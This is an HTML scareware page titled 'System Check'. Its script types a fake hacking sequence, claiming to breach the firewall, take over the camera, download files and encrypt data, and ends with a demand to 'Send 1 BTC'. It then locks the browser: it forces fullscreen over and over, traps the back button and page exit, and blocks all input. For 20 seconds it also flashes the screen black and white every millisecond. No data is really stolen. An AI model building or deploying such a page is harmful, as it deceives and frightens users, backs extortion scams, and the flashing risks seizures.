<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Check</title>
    <style>
        body {
            background-color: black;
            color: lime;
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            user-select: none; /* Makes text uncopyable */
            -webkit-user-select: none; /* Safari */
            -moz-user-select: none; /* Firefox */
            -ms-user-select: none; /* IE10+/Edge */
        }
        #terminal {
            white-space: pre-wrap;
            line-height: 1.5;
        }
        .blink {
            animation: blink 1s steps(2, start) infinite;
        }
        @keyframes blink {
            to { visibility: hidden; }
        }
        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9999;
            background: transparent;
            display: none;
        }
    </style>
</head>
<body>
    <div id="overlay"></div>
    <div id="terminal"></div>

    <script>
        const terminal = document.getElementById('terminal');
        const overlay = document.getElementById('overlay');
        
        const lines = [
            "Initializing system scan...",
            "Accessing device information...",
            "IP Address: 192.168.1." + Math.floor(Math.random() * 255),
            "Device: " + navigator.platform,
            "Browser: " + navigator.userAgent.split(' ')[0],
            "Breaching firewall",
            "Injecting payload",
            "Accessing camera and microphone",
            "Downloading personal files",
            "Encrypting data",
            "Tracing location",
            "HACK COMPLETE",
            "",
            "YOUR DEVICE HAS BEEN HACKED!!!",
            "All files encrypted. Send 1 BTC to save them."
        ];

        let i = 0;
        let lineIndex = 0;
        let flashingInterval;
        let freezeTimeout;
        let fullscreenInterval;

        function typeLine() {
            if (lineIndex >= lines.length) {
                terminal.innerHTML += '<br><span class="blink">_</span>';
                return;
            }

            const currentLine = lines[lineIndex];
            
            if (i < currentLine.length) {
                terminal.innerHTML += currentLine.charAt(i);
                i++;
                setTimeout(typeLine, 20 + Math.random() * 50); // Faster typing speed
            } else {
                terminal.innerHTML += '<br>';
                if (currentLine.includes(".")) {
                    let dots = 0;
                    const dotInterval = setInterval(() => {
                        terminal.innerHTML += '.';
                        dots++;
                        if (dots >= 3) {
                            clearInterval(dotInterval);
                            terminal.innerHTML += '<br>';
                            i = 0;
                            lineIndex++;
                            typeLine();
                        }
                    }, 300); // Faster dots
                } else {
                    i = 0;
                    lineIndex++;
                    setTimeout(typeLine, 500); // Faster line transitions
                }
            }

            // Trigger the freeze + flash when "HACK COMPLETE" finishes
            if (currentLine === "HACK COMPLETE") {
                setTimeout(startFreezeAndFlash, 1000);
            }
        }

        function enterFullscreen() {
            const elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen().catch(() => {});
            } else if (elem.webkitRequestFullscreen) {
                elem.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
            } else if (elem.mozRequestFullScreen) {
                elem.mozRequestFullScreen();
            } else if (elem.msRequestFullscreen) {
                elem.msRequestFullscreen();
            }
        }

        function isFullscreen() {
            return document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement || document.msFullscreenElement;
        }

        function startFreezeAndFlash() {
            enterFullscreen();

            // Force re-enter fullscreen if exited
            fullscreenInterval = setInterval(() => {
                if (!isFullscreen()) {
                    enterFullscreen();
                }
            }, 100); // Check every 100ms

            // Prevent back navigation during freeze
            history.pushState(null, null, location.href);
            window.onpopstate = () => {
                history.pushState(null, null, location.href);
                enterFullscreen(); // Force back to fullscreen on back attempt
            };

            // Block unload/leave attempts
            window.onbeforeunload = () => "System locked - cannot exit.";

            // Show invisible overlay to block all input
            overlay.style.display = 'block';

            // Block all possible user interactions (unmovable screen)
            const blockEvent = (e) => {
                e.preventDefault();
                e.stopPropagation();
                return false;
            };

            ['touchstart', 'touchmove', 'touchend', 'touchcancel',
             'mousedown', 'mousemove', 'mouseup', 'click', 'dblclick',
             'keydown', 'keyup', 'keypress', 'scroll', 'wheel', 'gesturestart',
             'gesturechange', 'gestureend'].forEach(evt => {
                window.addEventListener(evt, blockEvent, { passive: false, capture: true });
            });

            // Rapid background flashing (stronger, faster)
            let isBlack = true;
            flashingInterval = setInterval(() => {
                document.body.style.backgroundColor = isBlack ? 'white' : 'black';
                isBlack = !isBlack;
            }, 1);

            // Stop everything after 20 seconds
            freezeTimeout = setTimeout(() => {
                clearInterval(flashingInterval);
                clearInterval(fullscreenInterval);
                document.body.style.backgroundColor = 'black';
                overlay.style.display = 'none';

                // Remove event blockers
                ['touchstart', 'touchmove', 'touchend', 'touchcancel',
                 'mousedown', 'mousemove', 'mouseup', 'click', 'dblclick',
                 'keydown', 'keyup', 'keypress', 'scroll', 'wheel', 'gesturestart',
                 'gesturechange', 'gestureend'].forEach(evt => {
                    window.removeEventListener(evt, blockEvent, { passive: false, capture: true });
                });

                // Allow exit/back after freeze
                window.onpopstate = null;
                window.onbeforeunload = null;

                // Exit fullscreen
                if (document.exitFullscreen) document.exitFullscreen();
                else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
                else if (document.mozCancelFullScreen) document.mozCancelFullScreen();
                else if (document.msExitFullscreen) document.msExitFullscreen();
            }, 20000); // 20 seconds
        }

        // Start the typing animation
        setTimeout(() => {
            terminal.innerHTML = '> ';
            typeLine();
        }, 500); // Faster start
    </script>
</body>
</html>
